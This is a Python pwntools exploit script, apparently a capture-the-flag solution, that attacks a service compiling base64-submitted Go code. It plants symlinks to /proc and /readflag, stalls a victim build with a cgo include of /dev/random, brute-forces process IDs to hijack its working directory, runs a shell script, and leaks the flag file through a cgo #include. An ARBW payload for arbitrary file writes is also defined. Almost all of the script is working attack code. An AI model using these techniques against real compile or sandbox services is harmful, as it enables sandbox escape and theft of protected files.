#!/usr/bin/env python3

from base64 import b64encode
from pwn import context, remote

context.log_level = "error"

REMOTE = ("127.0.0.1", 31337)
SETTLE = 2.2
SPAN = 120

WARM = b'package main;import ."syscall";func main(){println(Getpid())}'
MK_P = b'package main;import ."os";func main(){panic(Symlink("/proc","/tmp/p"))}'
MK_T = b'package main;import ."os";func main(){Symlink("/readflag","/tmp/t")}'
MK_X = b'package main;import ."os";func main(){Symlink("c/main.go","/tmp/x")}'
CK_P = b'package main;import ."os";func main(){_,e:=Readlink("/tmp/p");panic(e)}'
CK_T = b'package main;import ."os";func main(){_,e:=Readlink("/tmp/t");panic(e)}'
CK_X = b'package main;import ."os";func main(){_,e:=Readlink("/tmp/x");panic(e)}'
RM_C = b'package main;import ."os";func main(){panic(Remove("/tmp/c"))}'
RM_F = b'package main;import ."os";func main(){panic(Remove("/tmp/f"))}'
VICTIM = b'//tmp/t pls>/tmp/f\npackage main\n/*#include"/dev/random"*/\nimport "C"'
TRIG = b'package main;import ."os/exec";func main(){Command("sh","/tmp/x").Run()}'
#LEAK = b'package main\n//#include"/tmp/f"\nimport "C"\nfunc main(){}'
LEAK  = b'package main\n//#include"/tmp/f"\nimport "C"\nfunc main(){}'
ARBW  = b'//e a>>a\npackage main\n/*#include"/dev/random"*/\nimport "C"'

def req(src: bytes, timeout: float = 6.0) -> bytes:
    io = remote(*REMOTE)
    io.recvuntil(b"source code (b64):\n")
    io.recvline()
    io.sendline(b64encode(src))
    out = io.recvall(timeout=timeout)
    io.close()
    return out


def link_c(pid: int) -> bytes:
    return f'package main;import ."os";func main(){{Symlink("p/{pid}/cwd","/tmp/c")}}'.encode()


def ensure(make: bytes, check: bytes, tries: int = 4) -> None:
    for _ in range(tries):
        req(make)
        if b"panic: nil" in req(check):
            return


def main() -> None:
    for _ in range(3):
        req(WARM)

    req(RM_F)
    req(RM_C)
    ensure(MK_P, CK_P)
    ensure(MK_T, CK_T)
    ensure(MK_X, CK_X)

    victim = remote(*REMOTE)
    victim.recvuntil(b"source code (b64):\n")
    victim.recvline()
    victim.sendline(b64encode(VICTIM))

    context.timeout = SETTLE
    victim.recvrepeat(SETTLE)

    probe = int(req(WARM).strip().splitlines()[-1])

    for pid in range(probe - SPAN, probe + 1):
        req(RM_C)
        req(link_c(pid))
        req(TRIG)
        leak = req(LEAK)
        if b"flag{" in leak:
            print(f"hit pid {pid}")
            print(leak.decode("latin1"), end="")
            print(f"len leak payload: {len(LEAK)}")
            victim.close()
            return

    print(req(LEAK).decode("latin1"), end="")
    victim.close()

if __name__ == "__main__":
    main()
